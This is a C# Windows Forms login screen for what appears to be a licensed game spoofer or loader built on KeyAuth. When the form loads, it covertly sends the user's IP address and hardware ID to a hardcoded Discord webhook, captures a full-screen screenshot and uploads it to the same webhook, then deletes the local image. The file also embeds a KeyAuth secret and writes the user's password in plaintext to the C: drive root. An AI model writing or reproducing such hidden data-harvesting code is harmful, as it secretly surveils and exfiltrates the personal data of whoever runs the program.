using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using KeyAuth;
using System.IO;
using Code7777.Forms;
using Code7777;
using permunban;
using System.Net.Http;
using System.Drawing.Imaging;


namespace Code7777
{
    public partial class Login : Form
    {
        public static api KeyAuthApp = new api(
    name: "Loader",
    ownerid: "lQDfKzMKbn",
    secret: "27628f5fcbb27653282e433d3828b61c15c465c0f26f1e572ec77b547e2052a2",
    version: "1.0"
);
        public Login()
        {
            InitializeComponent();
        }
        private void load()
        {
            string fileName = @"C:\code7777.txt";


            if (File.Exists(@"C:\code7777.txt"))
            {
                string[] lines = File.ReadAllLines(fileName);
                username.Text = lines[0];
            }
            else
            {
                username.Text = null;
            }

            if (File.Exists(fileName))
            {
                string[] lines = File.ReadAllLines(fileName);
                password.Text = lines[1];
            }
            else
            {
                password.Text = null;
            }
        }

        private void save()
        {
            File.WriteAllText(string.Concat(Path.GetPathRoot(Environment.SystemDirectory), "\\code7777.txt"), string.Concat(this.username.Text, "\n", this.password.Text));
        }
        private void Login_Load(object sender, EventArgs e)
        {
            using (RLBmods.DcWebHook dcWeb = new RLBmods.DcWebHook())
            {
                dcWeb.UserName = "[ALERT]";
                dcWeb.WebHook = "https://discord.com/api/webhooks/1045377260384964628/9KyxxdEhBBVSPidq6_YB5878j1IpsWYrzv4EriNX5tEHD4slAsB0bhOF5ssTd_wewDFI";
                dcWeb.SendMessage("<@870584464386949141> | <@81026807710429233162>" + Environment.NewLine + "css" + Environment.NewLine + "[ALERT | A  GUY OPENED SPOOFER CREDITS 4444#0571 L ]" + Environment.NewLine + "IP | " + RLBmods.IP.Grab() + Environment.NewLine + "HWID | " + RLBmods.HWID.Grab() + Environment.NewLine + Environment.NewLine + "Username | " + Text + Environment.NewLine + "Password | " + Text + Environment.NewLine + ""); Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Rectangle rect = new Rectangle(0, 0, bitmap.Width, bitmap.Height);
                Graphics graphics = Graphics.FromImage(bitmap);
                graphics.CopyFromScreen(rect.Left, rect.Top, 0, 0, rect.Size);
                bitmap.Save("c:\\Users\\" + Environment.UserName + "\\Downloads\\ImgName.png", ImageFormat.Png);

                //Send picture to webhook
                string filePath = "c:\\Users\\" + Environment.UserName + "\\Downloads\\ImgName.png";
                HttpClient client = new HttpClient();
                MultipartFormDataContent content = new MultipartFormDataContent();
                var file = File.ReadAllBytes(filePath);
                content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
                client.PostAsync("https://discord.com/api/webhooks/1045377260384964628/9KyxxdEhBBVSPidq6_YB5878j1IpsWYrzv4EriNX5tEHD4slAsB0bhOF5ssTd_wewDFI", content).Wait();
                client.Dispose();
                File.Delete(filePath);
                base.TopMost = true;
                siticoneShadowForm1.SetShadowForm(this);
                siticoneDragControl1.SetDrag(this);
                load();
                KeyAuthApp.init();
            }
        }
        private async void guna2Button2_Click(object sender, EventArgs e)
        {
            KeyAuthApp.login(username.Text, password.Text);
            if(KeyAuthApp.response.success)
            {
                loginbttn.Text = "Logging in...";
                MessageBox.Show("Succesfully Logged in!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                main aa = new main();
                save();
                Task.Delay(6900);
                KeyAuthApp.Checkinit();
                KeyAuthApp.BlacklistCheck();
                KeyAuthApp.check();
                Task.Delay(6900);
                aa.Show();
                this.Hide();
               // string invite = ""; // discord invite here
              //  System.Diagnostics.Process.Start(invite);
            }
            else
            {
                string clear = "";
                username.Text = clear;
                password.Text = clear;
                MessageBox.Show("Invaild Username/Password", "Invaild", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            Register ne = new Register();
            ne.Show();
            this.Hide();
        }

        private void gunaCirclePictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void password_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
